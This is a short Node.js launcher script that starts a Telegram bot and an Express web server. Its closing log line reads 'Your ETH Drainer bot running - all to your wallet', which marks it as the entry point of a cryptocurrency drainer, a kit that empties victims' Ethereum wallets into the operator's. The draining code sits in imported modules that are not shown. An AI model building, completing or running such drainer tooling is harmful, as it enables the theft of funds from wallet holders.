import TelegramBot from 'node-telegram-bot-api';
import { MS_Telegram_Token, setupTelegramBot } from './utils/Utilite.js';  // Added .js
import app from './index.js';  // Added .js (if index.ts exports app)

const bot = new TelegramBot(MS_Telegram_Token, { polling: true });
setupTelegramBot(bot);

bot.on('polling_error', (error) => {
  console.log('Polling error:', error);
});

// Start Express server (uses 'app')
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Web server running on port ${PORT}`);
});

process.on('SIGINT', () => {
  bot.stopPolling();
  process.exit();
});

console.log('Your ETH Drainer bot running - all to your wallet.');
